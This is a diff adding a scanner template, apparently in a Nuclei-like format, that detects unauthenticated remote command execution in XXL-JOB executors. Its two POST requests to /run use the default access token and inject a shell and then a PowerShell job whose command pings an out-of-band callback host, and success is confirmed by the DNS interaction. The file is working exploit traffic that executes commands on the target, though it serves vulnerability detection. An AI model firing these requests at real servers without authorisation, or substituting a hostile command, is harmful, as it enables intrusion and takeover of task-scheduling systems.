@@ -1,0 +1,85 @@
+id: xxljob-executor-unauth
+brief:
+    title: XXL-JOB executor - Unauthorized Access
+    by: k3rwin
+    level: critical
+    about: XXL-JOB is a distributed task scheduling platform. Its core design goals are rapid development, easy learning, lightweight, and easy expansion. The source code is now open and connected to the onli...
+    label:
+        - xxljob
+        - unauth
+        - misconfig
+        - rce
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/run'
+      head:
+        Content-Length: "396"
+        Content-Type: application/json
+        Xxl-Job-Access-Token: default_token
+      body: |-
+        {
+          "jobId": {{rand_int(1000)}},
+          "executorHandler": "demoJobHandler",
+          "executorParams": "demoJobHandler",
+          "executorBlockStrategy": "COVER_EARLY",
+          "executorTimeout": 0,
+          "logId": 1,
+          "logDateTime": 1586629003729,
+          "glueType": "GLUE_SHELL",
+          "glueSource": "ping {{interactsh-url}}",
+          "glueUpdatetime": 1586699003758,
+          "broadcastIndex": 0,
+          "broadcastTotal": 0
+        }
+      signs:
+        - "on": word
+          has:
+            - '{"code":200}'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+    - verb: POST
+      to:
+        - '{{BaseURL}}/run'
+      head:
+        Content-Length: "396"
+        Content-Type: application/json
+        Xxl-Job-Access-Token: default_token
+      body: |-
+        {
+          "jobId": {{rand_int(1000)}},
+          "executorHandler": "demoJobHandler",
+          "executorParams": "demoJobHandler",
+          "executorBlockStrategy": "COVER_EARLY",
+          "executorTimeout": 0,
+          "logId": 1,
+          "logDateTime": 1586629003729,
+          "glueType": "GLUE_POWERSHELL",
+          "glueSource": "ping {{interactsh-url}}",
+          "glueUpdatetime": 1586699003758,
+          "broadcastIndex": 0,
+          "broadcastTotal": 0
+        }
+      signs:
+        - "on": word
+          has:
+            - '{"code":200}'
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
